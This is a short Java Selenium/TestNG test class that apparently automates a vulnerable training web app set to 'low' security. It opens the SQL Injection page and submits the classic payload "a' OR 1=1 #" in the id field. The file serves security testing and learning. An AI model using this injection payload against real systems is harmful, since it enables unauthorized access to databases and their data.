package testcase;

import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.support.ui.Select;
import org.testng.annotations.Test;

import base.BaseTest;

public class Test4SQLinj {

	public class TestSQLInj extends BaseTest{
		boolean test = false;
		
		@Test
		public void sqlInjectionLow() throws InterruptedException {

		super.security("low");
		 
		driver.findElement(By.linkText("SQL Injection")).click();
		System.out.println(driver.getCurrentUrl());
		driver.findElement(By.name("id")).sendKeys("a' OR 1=1 #");
		driver.findElement(By.xpath("//*[@id=\"main_body\"]/div/div/form/p/input[2]")).click();
		Thread.sleep(1000)	;
				
			}

		}
		
		
		
		
}
